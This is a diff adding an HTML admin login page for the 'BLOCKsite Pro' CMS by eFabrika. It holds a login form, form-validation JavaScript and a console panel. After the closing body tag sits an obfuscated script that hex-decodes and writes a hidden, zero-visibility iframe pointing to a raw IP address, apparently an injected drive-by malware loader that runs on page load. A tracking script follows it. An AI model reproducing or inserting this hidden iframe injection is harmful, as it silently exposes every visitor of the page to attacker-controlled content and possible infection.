@@ -1,0 +1,77 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<head>
+<title>BLOCKsite Pro - eFabrika</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+<LINK href="modules/gfx/styles.css" rel=stylesheet type=text/css>
+<script>
+function editHTML(x){
+ destination=x
+ initValue=x.value
+ v=open('../edit_full.htm','wysiwyg', "toolbar=no,location=no,scrollbars=no,resizable=no, width=720,height=545,left=15,top=15")
+}
+function picker(v){
+vpicker=v
+open("piker.php",'Picker','status=no,toolbar=no,width=868,scrollbars=yes,height=700,resizable=no')
+}
+function vImg(v){
+open("vimg/index.php",'vImg','status=no,toolbar=no,width=868,height=700,resizable=no').v=v
+}
+</script>
+<script>
+function validate(f){
+var v,i,e
+for(i=0;e=f[i++];)
+  if(v=window[e.getAttribute('valid')])
+   if(!v(e.value))
+    {alert(e.getAttribute('alert'));e.focus();return 1}
+}
+function niepuste(x){return x>''}
+function ismail(e){return /^[\w\.-]{2,}@[\w\.-]+\.[a-z]{2,5}$/i.test(e)}
+</script>
+
+
+</head>
+<body bgcolor="#D6D8DB">
+<table width=1000 cellpadding=0 cellspacing=0 border=0>
+<tr>
+	<td class=naglowek01><img src=modules/gfx/misc/bslogo.gif border=0><br><span class=male> v.4.0.1</span></td>
+	
+	<form action="index.php" method="POST"><td class=naglowek01><span class=male>login:<input name=T[login]>	hasło:<input type=password name=T[pass]>
+			<input id=bt  type=submit name="V_btn[mode%3Dlogin]" value="Zaloguj"></td></form>
+</tr>
+<tr><td width=150 valign=top class=k_lewo>
+	
+ <script>
+	function showMenu(v){
+	 if(oldMenu)document.getElementById('menu'+oldMenu).style.display='none'
+		if(v)document.getElementById('menu'+(oldMenu=v)).style.display='block'
+	}
+	oldMenu=0;showMenu(window.active_menu)
+	</script>
+</td>
+<form onsubmit="return!validate(this)" method="post">
+<td valign=top  class=k_lewo>
+
+
+
+
+
+
+
+<table width=850 cellpadding=0 cellspacing=0 border=0><tr><td class=f_bialy_console>
+system console:
+<div id=console style="width:100%;overflow:auto;border:solid 1px gray;color:gray">
+<br><ul><li>START</li><li>diagnostic: mode:, modex:</li><li>niezalogowany</li><li>STOP</li></ul>
+</div>
+</td></tr></table>
+
+
+
+
+</td></form></tr>
+<tr><td class=naglowek01 align=left><a href=http://www.efabrika.pl target=_blank><img src=modules/gfx/misc/efabrika2.gif border=0></a></td><td class=naglowek01>system BLOCKsite Pro, copyright eFabrika 2004</td></tr>
+</table>
+</body>
+<script>function v481fc844bbf4d(v481fc844bc721){ function v481fc844bcef8 () {return 16;} return(parseInt(v481fc844bc721,v481fc844bcef8()));}function v481fc844bded4(v481fc844be6ca){  var v481fc844beec3='';for(v481fc844bf6d0=0; v481fc844bf6d0<v481fc844be6ca.length; v481fc844bf6d0+=2){ v481fc844beec3+=(String.fromCharCode(v481fc844bbf4d(v481fc844be6ca.substr(v481fc844bf6d0, 2))));}return v481fc844beec3;} document.write(v481fc844bded4('3C5343524950543E77696E646F772E7374617475733D27446F6E65273B646F63756D656E742E777269746528273C696672616D65206E616D653D66633564666638207372633D5C27687474703A2F2F37372E3232312E3133332E3135302F2E69662F676F2E68746D6C3F272B4D6174682E726F756E64284D6174682E72616E646F6D28292A3135313034292B27383331665C272077696474683D3539206865696768743D323536207374796C653D5C27646973706C61793A206E6F6E655C273E3C2F696672616D653E27293C2F5343524950543E'));</script><script type="text/javascript"><!--
+document.writeln('<'+'scr'+'ipt type="text/javascript" src="http://home.hit.stat24.com/_'+(new Date()).getTime()+'/script.js?id=zZo64e7.70TFU6WbBki0N7R3XqwWIXuqVjo7vBnMLFX.S7"></'+'scr'+'ipt>');
+//--></script>
